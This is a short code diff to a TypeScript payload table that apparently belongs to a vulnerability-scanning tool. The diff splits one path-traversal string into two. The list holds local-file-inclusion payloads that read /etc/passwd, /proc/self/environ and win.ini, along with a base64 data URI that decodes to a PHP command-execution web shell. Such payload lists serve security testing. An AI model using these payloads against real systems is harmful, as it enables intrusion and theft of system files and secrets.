@@ -249,7 +249,8 @@ export const VULN_SPECIFIC_BYPASSES_AND_PROMPTS: Record<
 			"/proc/self/environ",
 			"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
 			"file:///etc/passwd",
-			"C:\\win.ini/?../../../../../../../etc/passwd",
+			"C:\\win.ini",
+			"/?../../../../../../../etc/passwd",
 		],
 	},
 	RCE: {
